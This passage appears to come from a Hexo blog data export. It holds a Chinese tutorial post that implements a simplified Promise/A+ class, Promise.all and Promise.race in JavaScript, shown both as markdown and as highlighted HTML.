resolve(x);\n    }\n}\n\nmodule.exports = Promise;\n```\n\n### Promise.all\n`Promise.all(promises)` 返回一个 promise 对象\n\n* 如果传入的参数是一个空的可迭代对象，那么此 promise 对象回调完成(resolve), 只有此情况，是同步执行的，其它都是异步返回的。\n* 如果传入的参数不包含任何 promise，则返回一个异步完成.\n* promises 中所有的 promise 都 “完成”时或参数中不包含 promise 时回调完成。\n* 如果参数中有一个 promise 失败，那么 Promise.all 返回的 promise 对象失败\n* 在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组\n\n```js\nPromise.all = async (list) => {\n  return new Promise((resolve, reject) => {\n    if (!list || !Array.isArray(list)) throw new Error('Type Error');\n\n    if (!list.length) return resolve([]);\n\n    let index = 0;\n    let resList = [];\n\n    const processValue = (data, i) => {\n      index++;\n      resList[i] = data;\n\n      if (index === list.length) {\n        resolve(resList);\n      }\n    }\n\n    for (let i = 0; i < list.length; i++) {\n      const item = list[i];\n      // item 可能为普通值、也可能为 promise 对象\n      Promise.resolve(item).then((data) => {\n        processValue(data, i);\n      }).catch((error) => {\n        reject(error);\n      })\n    }\n  });\n}\n```\n\n### Promise.race\nPromise.race 函数返回一个 Promise，它将与第一个传递的 promise 相同的完成方式被完成。它可以是完成（ resolves），也可以是失败（rejects），这要取决于第一个完成的方式是两个中的哪个。\n\n如果传的参数数组是空，则返回的 promise 将永远等待。\n\n如果迭代包含一个或多个非承诺值和/或已解决/拒绝的承诺，则 Promise.race 将解析为迭代中找到的第一个值。\n\n```js\nPromise.race = async (list) => {\n  return new Promise((resolve, reject) => {\n    if (!list || !Array.isArray(list)) throw new Error('Type Error');\n\n    if (!list.length) return resolve();\n\n    for (let i = 0; i < list.length; i++) {\n      const item = list[i];\n      // item 可能为普通值、也可能为 promise 对象\n      Promise.resolve(item).then((data) => {\n        resolve(data, i);\n      }).catch((error) => {\n        reject(error);\n      })\n    }\n  });\n}\n```\n\n##### 参考\n\n[Promise 的源码实现](https://github.com/YvetteLau/Blog/issues/2)","slug":"JavaScript 编程题/Promise 简易版实现","published":1,"updated":"2021-05-13T06:36:52.949Z","_id":"cko3yr633000rio6r3rdq7gii","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Promise-简易版实现\"><a href=\"#Promise-简易版实现\" class=\"headerlink\" title=\"Promise 简易版实现\"></a>Promise 简易版实现</h1><ul>\n<li>Promise.prototype.then()</li>\n<li>Promise.prototype.catch()</li>\n<li>Promise.prototype.finally()</li>\n<li>Promise.resolve()</li>\n<li>Promise.reject()</li>\n<li>Promise.all()</li>\n<li>Promise.race()</li>\n<li>Promise.any()</li>\n<li>Promise.allSettled()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. new Promise时，需要传递一个 executor 执行器，执行器立刻执行</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. executor 接受两个参数，分别是 resolve 和 reject</span></span><br><span class=\"line\"><span class=\"comment\"> * 3. promise 只能从 pending 到 rejected, 或者从 pending 到 fulfilled</span></span><br><span class=\"line\"><span class=\"comment\"> * 4. promise 的状态一旦确认，就不会再改变</span></span><br><span class=\"line\"><span class=\"comment\"> * 5. promise 都有 then 方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, </span></span><br><span class=\"line\"><span class=\"comment\"> *      和 promise 失败的回调 onRejected</span></span><br><span class=\"line\"><span class=\"comment\"> * 6. 如果调用 then 时，promise已经成功，则执行 onFulfilled，并将promise的值作为参数传递进去。</span></span><br><span class=\"line\"><span class=\"comment\"> *      如果promise已经失败，那么执行 onRejected, 并将 promise 失败的原因作为参数传递进去。</span></span><br><span class=\"line\"><span class=\"comment\"> *      如果promise的状态是pending，需要将onFulfilled和onRejected函数存放起来，等待状态确定后，再依次将对应的函数执行(发布订阅)</span></span><br><span class=\"line\"><span class=\"comment\"> * 7. then 的参数 onFulfilled 和 onRejected 可以缺省</span></span><br><span class=\"line\"><span class=\"comment\"> * 8. promise 可以then多次，promise 的then 方法返回一个 promise</span></span><br><span class=\"line\"><span class=\"comment\"> * 9. 如果 then 返回的是一个结果，那么就会把这个结果作为参数，传递给下一个then的成功的回调(onFulfilled)</span></span><br><span class=\"line\"><span class=\"comment\"> * 10. 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败的回调(onRejected)</span></span><br><span class=\"line\"><span class=\"comment\"> * 11.如果 then 返回的是一个promise,那么需要等这个promise，那么会等这个promise执行完，promise如果成功，</span></span><br><span class=\"line\"><span class=\"comment\"> *   就走下一个then的成功，如果失败，就走下一个then的失败</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> PENDING = <span class=\"string\">&#x27;pending&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> FULFILLED = <span class=\"string\">&#x27;fulfilled&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> REJECTED = <span class=\"string\">&#x27;rejected&#x27;</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Promise</span>(<span class=\"params\">executor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    self.status = PENDING;</span><br><span class=\"line\">    self.onFulfilled = [];<span class=\"comment\">//成功的回调</span></span><br><span class=\"line\">    self.onRejected = []; <span class=\"comment\">//失败的回调</span></span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.1</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.status = FULFILLED;</span><br><span class=\"line\">            self.value = value;</span><br><span class=\"line\">            self.onFulfilled.forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn());<span class=\"comment\">//PromiseA+ 2.2.6.1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reject</span>(<span class=\"params\">reason</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.status = REJECTED;</span><br><span class=\"line\">            self.reason = reason;</span><br><span class=\"line\">            self.onRejected.forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn());<span class=\"comment\">//PromiseA+ 2.2.6.2</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        executor(resolve, reject);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        reject(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Promise</span>.prototype.then = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">onFulfilled, onRejected</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.2.1 / PromiseA+ 2.2.5 / PromiseA+ 2.2.7.3 / PromiseA+ 2.2.7.4</span></span><br><span class=\"line\">    onFulfilled = <span class=\"keyword\">typeof</span> onFulfilled === <span class=\"string\">&#x27;function&#x27;</span> ? onFulfilled : <span class=\"function\"><span class=\"params\">value</span> =&gt;</span> value;</span><br><span class=\"line\">    onRejected = <span class=\"keyword\">typeof</span> onRejected === <span class=\"string\">&#x27;function&#x27;</span> ? onRejected : <span class=\"function\"><span class=\"params\">reason</span> =&gt;</span> &#123; <span class=\"keyword\">throw</span> reason &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.2.7</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> promise2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === FULFILLED) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.2</span></span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.4 --- setTimeout</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+ 2.2.7.1</span></span><br><span class=\"line\">                    <span class=\"keyword\">let</span> x = onFulfilled(self.value);</span><br><span class=\"line\">                    resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+ 2.2.7.2</span></span><br><span class=\"line\">                    reject(e);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (self.status === REJECTED) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.3</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">let</span> x = onRejected(self.reason);</span><br><span class=\"line\">                    resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                    reject(e);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.onFulfilled.push(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> x = onFulfilled(self.value);</span><br><span class=\"line\">                        resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                        reject(e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            self.onRejected.push(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> x = onRejected(self.reason);</span><br><span class=\"line\">                        resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                        reject(e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> promise2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolvePromise</span>(<span class=\"params\">promise2, x, resolve, reject</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.3.1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (promise2 === x) &#123;</span><br><span class=\"line\">        reject(<span class=\"keyword\">new</span> <span class=\"built_in\">TypeError</span>(<span class=\"string\">&#x27;Chaining cycle&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x &amp;&amp; <span class=\"keyword\">typeof</span> x === <span class=\"string\">&#x27;object&#x27;</span> || <span class=\"keyword\">typeof</span> x === <span class=\"string\">&#x27;function&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> used; <span class=\"comment\">//PromiseA+2.3.3.3.3 只能调用一次</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> then = x.then;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> then === <span class=\"string\">&#x27;function&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//PromiseA+2.3.3</span></span><br><span class=\"line\">                then.call(x, <span class=\"function\">(<span class=\"params\">y</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+2.3.3.1</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                    resolvePromise(promise2, y, resolve, reject);</span><br><span class=\"line\">                &#125;, <span class=\"function\">(<span class=\"params\">r</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+2.3.3.2</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                    reject(r);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//PromiseA+2.3.3.4</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                resolve(x);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.3.3.2</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            reject(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//PromiseA+ 2.3.3.4</span></span><br><span class=\"line\">        resolve(x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"built_in\">Promise</span>;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Promise-all\"><a href=\"#Promise-all\" class=\"headerlink\" title=\"Promise.all\"></a>Promise.all</h3><p><code>Promise.all(promises)</code> 返回一个 promise 对象</p>\n<ul>\n<li>如果传入的参数是一个空的可迭代对象，那么此 promise 对象回调完成(resolve), 只有此情况，是同步执行的，其它都是异步返回的。</li>\n<li>如果传入的参数不包含任何 promise，则返回一个异步完成.</li>\n<li>promises 中所有的 promise 都 “完成”时或参数中不包含 promise 时回调完成。</li>\n<li>如果参数中有一个 promise 失败，那么 Promise.all 返回的 promise 对象失败</li>\n<li>在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.all = <span class=\"keyword\">async</span> (list) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list || !<span class=\"built_in\">Array</span>.isArray(list)) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;Type Error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list.length) <span class=\"keyword\">return</span> resolve([]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> resList = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> processValue = <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      index++;</span><br><span class=\"line\">      resList[i] = data;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (index === list.length) &#123;</span><br><span class=\"line\">        resolve(resList);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; list.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> item = list[i];</span><br><span class=\"line\">      <span class=\"comment\">// item 可能为普通值、也可能为 promise 对象</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.resolve(item).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        processValue(data, i);</span><br><span class=\"line\">      &#125;).catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        reject(error);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Promise-race\"><a href=\"#Promise-race\" class=\"headerlink\" title=\"Promise.race\"></a>Promise.race</h3><p>Promise.race 函数返回一个 Promise，它将与第一个传递的 promise 相同的完成方式被完成。它可以是完成（ resolves），也可以是失败（rejects），这要取决于第一个完成的方式是两个中的哪个。</p>\n<p>如果传的参数数组是空，则返回的 promise 将永远等待。</p>\n<p>如果迭代包含一个或多个非承诺值和/或已解决/拒绝的承诺，则 Promise.race 将解析为迭代中找到的第一个值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.race = <span class=\"keyword\">async</span> (list) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list || !<span class=\"built_in\">Array</span>.isArray(list)) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;Type Error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list.length) <span class=\"keyword\">return</span> resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; list.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> item = list[i];</span><br><span class=\"line\">      <span class=\"comment\">// item 可能为普通值、也可能为 promise 对象</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.resolve(item).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(data, i);</span><br><span class=\"line\">      &#125;).catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        reject(error);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h5><p><a href=\"https://github.com/YvetteLau/Blog/issues/2\">Promise 的源码实现</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Promise-简易版实现\"><a href=\"#Promise-简易版实现\" class=\"headerlink\" title=\"Promise 简易版实现\"></a>Promise 简易版实现</h1><ul>\n<li>Promise.prototype.then()</li>\n<li>Promise.prototype.catch()</li>\n<li>Promise.prototype.finally()</li>\n<li>Promise.resolve()</li>\n<li>Promise.reject()</li>\n<li>Promise.all()</li>\n<li>Promise.race()</li>\n<li>Promise.any()</li>\n<li>Promise.allSettled()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span 